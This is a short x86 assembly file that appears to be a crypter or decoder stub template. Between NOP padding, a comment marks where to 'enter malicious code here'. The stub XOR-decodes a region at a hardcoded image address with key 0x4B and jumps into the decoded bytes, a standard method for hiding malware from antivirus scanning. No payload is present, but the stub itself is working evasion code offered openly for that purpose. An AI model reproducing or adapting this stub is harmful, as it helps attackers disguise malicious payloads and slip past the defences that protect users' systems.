    .code

main proc
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

; -------------------------------------------
; enter malicious code here
; -------------------------------------------

    xor ecx, ecx
    xor esi, esi
    mov ecx, 0C9Ah                      ; set loop counter
    mov esi, 00401000h                  ; set address of encoded code (image base + code RVA)
    
encoder_loop:
    xor byte ptr [ecx + esi - 1h], 4Bh  ; decode byte
    loop encoder_loop                   ; loop if not finished

    jmp near ptr [esi]                  ; jump to the decoded code

; -------------------------------------------

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
main endp

end